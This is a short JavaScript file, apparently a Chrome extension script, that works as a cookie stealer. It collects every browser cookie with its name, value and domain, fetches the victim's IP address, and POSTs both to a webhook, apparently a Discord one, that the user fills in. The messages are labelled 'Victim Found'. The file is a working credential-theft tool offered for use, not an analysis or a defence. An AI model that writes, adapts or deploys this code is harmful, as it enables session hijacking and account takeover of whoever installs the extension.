const WEBHOOK = "";

async function main() {
  var ipAddr = await (await fetch("https://api.ipify.org")).text();

  chrome.cookies.getAll({}, function (cookies) {
    var cookiesData = [];
    for (var i = 0; i < cookies.length; i++) {
      cookiesData.push({
        "name": cookies[i].name,
        "value": cookies[i].value,
        "domain": cookies[i].domain
      });
    }

    fetch(WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "Application/json"
      },
      body: JSON.stringify({
        "content": null,
        "embeds": [
          {
            "description": "```" + JSON.stringify(cookiesData) + "```",
            "color": null,
            "fields": [],
            "author": {
              "name": "Victim Found: " + ipAddr,
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
            },
            "footer": {
              "text": "https://github.com/Nabeel-javaid",
              "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
            }
          }
        ],
        "username": "Victim",
        "avatar_url": "https://www.flaticon.com/free-icon/discord_3670157",
        "attachments": []
      })
    });
  });
}

main();
